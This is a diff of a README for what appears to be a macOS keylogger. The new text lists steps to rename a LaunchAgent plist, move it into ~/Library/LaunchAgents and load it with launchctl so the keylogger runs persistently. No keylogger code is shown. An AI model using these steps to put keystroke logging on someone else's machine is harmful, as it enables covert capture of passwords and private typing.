@@ -1,3 +1,13 @@
-run using the following command:
+run using the following steps:
 
-launchctl load ~/Library/LaunchAgents/com.example.keylogger.plist
+1. change name of launchagent.plist to com.{insert your own user}.keylogger.plist
+
+2. Edit the launch agent file for the updated file paths
+
+3. install the launch agent
+
+   mv com.user.keylogger.plist ~/Library/LaunchAgents/
+
+4. load the launch agent
+
+   launchctl load ~/Library/LaunchAgents/com.{user}.keylogger.plist
